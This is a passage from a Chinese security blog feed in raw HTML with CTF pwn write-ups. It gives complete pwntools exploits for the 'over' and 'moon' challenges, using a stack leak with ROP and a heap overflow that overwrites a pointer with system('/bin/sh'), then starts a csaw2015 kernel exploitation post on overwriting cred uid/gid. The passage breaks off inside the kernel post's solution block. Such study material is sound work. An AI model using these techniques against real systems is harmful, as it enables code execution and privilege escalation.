class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./over"</span>)</span><br><span class="line">p = process(<span class="string">"./over"</span>)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="comment">#staget 1 to leak ebppdb.set_trace()</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'A'</span>*<span class="number">79</span>)</span><br><span class="line">p.recv(<span class="number">80</span>)</span><br><span class="line">v_ebp =  u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leaked ebp :"</span>,hex(v_ebp)</span><br><span class="line"><span class="comment"># stage 2 to leak puts address</span></span><br><span class="line">p.recv()</span><br><span class="line">poprdi = p64(<span class="number">0x400793</span>)sh</span><br><span class="line">puts_gotplt = p64(<span class="number">0x601020</span>)</span><br><span class="line">puts_addr = p64(<span class="number">0x4006B9</span>)</span><br><span class="line">popret = p64(<span class="number">0x4006be</span>)</span><br><span class="line">payload2 = p64(v_ebp<span class="number">-0x50</span>)+poprdi+puts_gotplt + puts_addr+p64(v_ebp)+p64(<span class="number">0x400676</span>)+<span class="string">'A'</span>*<span class="number">32</span>+ p64(v_ebp<span class="number">-0x70</span>)+(popret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_libc_addr = u64(p.recv(<span class="number">6</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_libc_addr:"</span>,hex(puts_libc_addr)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment">#libc_2.23.so00007FB7B403900000007FB7B40A8690</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">libc_puts_system_offset = <span class="number">0x7F449904E690</span> - <span class="number">0x7F4499024390</span></span><br><span class="line">libc_binsh_puts_offset = <span class="number">0x7F6B855B3D57</span> - <span class="number">0x7F6B85496690</span></span><br><span class="line">libc_binsh_address = puts_libc_addr+libc_binsh_puts_offset</span><br><span class="line">libc_system_address = puts_libc_addr - libc_puts_system_offset </span><br><span class="line">payload3 = p64(v_ebp<span class="number">-0x50</span>)+poprdi+p64(libc_binsh_address) + p64(libc_system_address)+<span class="string">'A'</span>*<span class="number">48</span>+ p64(v_ebp<span class="number">-0x98</span>)+(popret)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># system7F4499024390</span></span><br><span class="line"><span class="comment"># puts7F449904E690</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#binsh 00007F6B855B3D57</span></span><br><span class="line"><span class="comment">#puts7F6B85496690</span></span><br></pre></td></tr></table></figure></p><h3 id="moon"><a href="#moon" class="headerlink" title="moon"></a>moon</h3><p>题目稍微多一点,但是利用起来也并不困难,查看代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">switch</span> ( get_choice() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      create();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      mydelete();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      edit();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      show();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      myexit();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"Sorry,Incorrect choice!\n"</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>认真分析一些代码,发现如下两个点:<br>show函数如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"which moon do you want to show:"</span>, <span class="number">0x1F</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"moon's id is worry\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write(<span class="number">1</span>, mo[v1], <span class="number">16u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>write(1, mo[v1], 16uLL);总是输出16位,这肯定有问题的.<br>再看edit函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"which moon do you want to edit:"</span>, <span class="number">0x1F</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> &amp;&amp; mo[v1] )</span><br><span class="line">    read_mbuf((__int64)mo[v1], <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"moon's id is worry\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>read_mbuf((__int64)mo[v1], 128);刚好溢出8个字节,覆盖free函数指针至system()即可,但是我们怎么得到system地址.<br>上面的show函数给我们提供了泄漏的机会,无论我们输入多少个字节,它都能输出16个字节.泄漏流程大致如下:</p><ol><li>申请一个moon</li><li>再申请一个moon</li><li>删除第一个moon,这个时候的话moon堆里面就变成了fd,bk都指向main_arena的malloc_state的top地址.</li><li>申请一个moon,占住删除的第一个moon,利用show进行泄漏即可.<br>原理一张图就能讲清楚.<br><img src="/img/arena.png" alt="arena.png"></li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./moon"</span>)</span><br><span class="line">p = process(<span class="string">"./moon"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createmoon</span><span class="params">(moon_name)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(moon_name)</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editmoon</span><span class="params">(id,moon_name)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">    p.send(moon_name)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletemoon</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showmoon</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">    tmp =  p.recv(<span class="number">8</span>)</span><br><span class="line">    addr = p.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">createmoon(<span class="string">"moon1"</span>)</span><br><span class="line">createmoon(<span class="string">"moon2"</span>)</span><br><span class="line">deletemoon(<span class="string">"0"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">createmoon(<span class="string">"moon3"</span>)</span><br><span class="line">ret_str = showmoon(<span class="string">"0"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">libc_malloc_state_top = u64(ret_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_malloc_state_top :"</span>,hex(libc_malloc_state_top)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_malloc_state_top off_7FABDEE46B78   libc_2.23.so00007FABDEA8200000007FABDEC42000R.XD.byte0000publicCODE6400000000000000000000</span></span><br><span class="line">malloc_state_libc_offset = <span class="number">0x7FABDEE46B78</span> - <span class="number">0x7FABDEA82000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system7EFD38522390 libc_2.23.so00007EFD384DD00000007EFD3869D000R.XD.byte0000publicCODE6400000000000000000000</span></span><br><span class="line">system_libc_offset = <span class="number">0x7EFD38522390</span><span class="number">-0x7EFD384DD000</span></span><br><span class="line">libc_system_addr = libc_malloc_state_top - malloc_state_libc_offset + system_libc_offset</span><br><span class="line">createmoon(<span class="string">"moon4"</span>)</span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>+<span class="string">'A'</span>*<span class="number">112</span>+p64(libc_system_addr)</span><br><span class="line">editmoon(<span class="string">"0"</span>,payload)</span><br><span class="line">deletemoon(<span class="string">"0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://pan.baidu.com/s/16gD9t5SVkkIkMahElDaSMw" target="_blank" rel="noopener">https://pan.baidu.com/s/16gD9t5SVkkIkMahElDaSMw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Linux-csaw2015</title>
    <link href="https://foyjog.github.io/2018/07/05/Linux-Kernel-Exploitation-on-Linux-csaw2015/"/>
    <id>https://foyjog.github.io/2018/07/05/Linux-Kernel-Exploitation-on-Linux-csaw2015/</id>
    <published>2018-07-05T09:01:10.000Z</published>
    <updated>2018-07-05T09:52:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>额,还是看代码,先看懂再说.认真分析一遍,一个关于读取,扩大缩小ipc的程序.再看一下漏洞点,其实这是一个整数溢出的漏洞,通过将-1设置为new size,就可以达到64位内核所有地址的读写操作.</p><p>这里只记录一下这道题目的一些知识点.</p><h3 id="关于cred和real-cred"><a href="#关于cred和real-cred" class="headerlink" title="关于cred和real_cred"></a>关于cred和real_cred</h3><p>这两个结构体都在task_struct中.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>  <span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">                                     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">                                       it with task_lock())</span></span><br><span class="line"><span class="comment">                                     - initialized normally by setup_new_exec */</span></span><br><span class="line">......</span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>  <span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">                                     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">                                       it with task_lock())</span></span><br><span class="line"><span class="comment">                                     - initialized normally by setup_new_exec */</span></span><br></pre></td></tr></table></figure></p><p>这两个结构体一般都是指向一个地址的.但是有一些区别,read_cred指的是该进程能访问该进程所需的特权信息的结构，而cred指的是包含进程在尝试执行其他操作时将具有的权限信息的结构。即一个是对自己的权限,一个是操作其他的权限.<br>他们的结构体如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">        <span class="keyword">atomic_t</span>        usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">        <span class="keyword">atomic_t</span>        subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">        <span class="keyword">void</span>            *put_addr;</span><br><span class="line">        <span class="keyword">unsigned</span>        magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC      0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">kuid_t</span>          uid;            <span class="comment">/* real UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          gid;            <span class="comment">/* real GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          suid;           <span class="comment">/* saved UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          sgid;           <span class="comment">/* saved GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          euid;           <span class="comment">/* effective UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          egid;           <span class="comment">/* effective GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          fsuid;          <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          fsgid;          <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">        <span class="keyword">unsigned</span>        securebits;     <span class="comment">/* SUID-less security management */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_bset;       <span class="comment">/* capability bounding set */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure></p><p>很明显能看出来修改uid,gid这几个字段是我们的目的所在了.</p><p>writeup中是通过设置 char comm[TASK_COMM_LEN]; 来作为标记,然后进行内存的搜索,只要搜索到了,就能确实uid和gid的位置.</p><h3 id="64内核的结构和32位内核的结构"><a href="#64内核的结构和32位内核的结构" class="headerlink" title="64内核的结构和32位内核的结构"></a>64内核的结构和32位内核的结构</h3><p>通常32位Linux内核地址空间划分0~3G为用户空间，3~4G为内核空间。<br><img src="/img/32linux.png" alt="我是图片"></p><p>64位地址时将0x0000,0000,0000,0000 – 0x0000,7fff,ffff,f000这128T地址用于用户空间。<br>而0xffff,8000,0000,0000以上为系统空间地址。<br><img src="/img/64linux.png" alt="我是图片"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这两个星期在做fuzz的时候吧csaw的题目刷了一下,后面的两个题目因为时间,我没有选择去编译内核调试,只是理解了一下,其实在调试的时候会发现更多的问题吧,csaw这些内核题让我对内核有一些初步的了解,但是还远远不够,接下来我想要开始调试一些真正的cve了,希望通过调试一些cve,能够迈进漏洞挖掘的大门吧,慢慢来,不急于一时.</p><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span 